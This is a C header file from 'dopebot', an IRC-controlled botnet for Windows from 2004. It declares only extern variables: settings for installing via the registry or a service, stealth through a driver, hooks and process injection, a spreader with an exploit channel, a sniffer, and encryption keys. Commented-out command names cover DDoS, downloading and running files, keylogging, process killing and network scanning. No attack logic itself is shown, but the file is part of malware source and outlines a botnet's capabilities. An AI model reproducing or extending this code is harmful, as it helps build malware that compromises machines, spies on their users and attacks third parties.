/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

//Externs, For Global Variable Use
/*-------------------------------------------------------------------------------*/
//Bot Settings
	extern const char *botname;
	extern const char *botversion;
	extern const char *prefix;
	extern const char *version;
	extern const int maxrand;
	extern const bool uptimenick;
//Daemon Settings
	extern const char *ftpduser;
	extern const char *ftpdpass;
	extern const int ftpdport;
	extern const int tftpdport;
//Install Settings
	extern const char *filename;
	extern const char *regkeyname;
	extern const char *servicename;
	extern const bool useregistry;
	extern const bool useservice;
//IRC Settings
//	extern serverlist servers[];
	extern const char *serverpassword;
	extern const char *channel;
	extern const char *channelpassword;
	extern const bool useoschannel;
//Security Settings
	extern const char *botpassword;
	extern const char *hostauth[];
	extern const char *teakey;
	extern const int xorkey;
//Sniffer Settings
	extern const char *snifferchannel;
//Spreader Settings
	extern const char *exploitchannel;
//Stealth Settings
	extern const char *driverfilename;
	extern const char *drivername;
	extern const char *hookfilename;
	extern const char *injectprocess;
	extern const int ircport;
/*-------------------------------------------------------------------------------*/
/*
//Bot Command Names
	extern const char *cmd_botgroup;
////
	extern const char *cmd_botdisconnect;
	extern const char *cmd_botinfo;
	extern const char *cmd_botlog;
	extern const char *cmd_botlogin;
	extern const char *cmd_botlogout;
	extern const char *cmd_botnetinfo;
	extern const char *cmd_botraw;
	extern const char *cmd_botremove;
	extern const char *cmd_botsysinfo;
//DDOS Command Names
	extern const char *cmd_ddosgroup;
////
	extern const char *cmd_ddosbandwith;
//Download Command Names
	extern const char *cmd_downloadgroup;
////
	extern const char *cmd_downloadhttp;
	extern const char *cmd_downloadupdate;
//File Command Names
	extern const char *cmd_filegroup;
////
	extern const char *cmd_filedelete;
	extern const char *cmd_fileexecute;
	extern const char *cmd_fileopen;
//Keylogger Command Names
	extern const char *cmd_keyloggroup;
////
	extern const char *cmd_keylogstart;
	extern const char *cmd_keylogstop;
//Process Command Names
	extern const char *cmd_processgroup;
////
	extern const char *cmd_processlist;
	extern const char *cmd_processkill;
//Scan Command Names
	extern const char *cmd_scangroup;
////
	extern const char *cmd_scancip;
	extern const char *cmd_scanstart;
	extern const char *cmd_scanstop;
//Sniffer Command Names
	extern const char *cmd_sniffgroup;
////
	extern const char *cmd_snifferstart;
	extern const char *cmd_snifferstop;
*/